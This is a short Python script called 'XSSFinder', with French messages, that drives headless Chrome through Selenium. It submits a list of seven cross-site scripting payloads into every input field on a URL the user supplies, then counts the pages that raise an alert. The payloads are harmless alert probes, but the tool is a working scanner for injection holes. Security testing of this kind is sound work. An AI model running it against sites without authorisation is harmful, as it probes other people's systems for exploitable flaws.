from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoAlertPresentException
import time

allXss = ["<script>alert(123);</script>", "<img src=x onerror=alert(123)>", "<div style='background-image: url(javascript:alert(123))'>", "<!-- <script>alert(123)</script> -->", "<svg/onload=alert(123)>", "'><script>alert(123);</script>",'"><script>alert(123);</script>']

print("Welcome to XSSFinder")
faille = 0

def check_for_alert(driver, xss,info):
    try:
        global faille
        alert = WebDriverWait(driver, 0.3).until(EC.alert_is_present())
        print("Xss Présente sur la balise :  ", info, " avec la xss : ", xss)
        alert.accept()
        faille += 1
        return True
    except:
        return False

url = input("Put the URL: ")

options = Options()
options.add_argument("--headless=new")
driver = webdriver.Chrome(options=options)
driver.get(url)
print("Lancement de l'analyse du site...")
time.sleep(1)

total = len(driver.find_elements(By.TAG_NAME, 'input')) * len(allXss)
avancement = 0

for input_element_index in range(len(driver.find_elements(By.TAG_NAME, 'input'))):
    for xss in allXss:
        try:
            avancement += 1
            pt = (avancement / total) * 100
            print(str(int(pt)) + "%")
            
            input_elements = driver.find_elements(By.TAG_NAME, 'input')
            input_element = input_elements[input_element_index]
            infoAtt = input_element.get_attribute('outerHTML')
            fullXss = xss
            # WebDriverWait(driver, 2).until(EC.element_to_be_clickable(input_element))
            input_element.clear()
            input_element.send_keys(fullXss)
            time.sleep(0.2)
            input_element.send_keys(Keys.RETURN)
            time.sleep(0.2)
            check_for_alert(driver, fullXss,infoAtt)
            driver.get(url)
            time.sleep(1)
        
        except Exception as e:
            pass

print("Analyse terminée " + str(faille) + " faille(s) trouvée(s) !")
driver.quit()
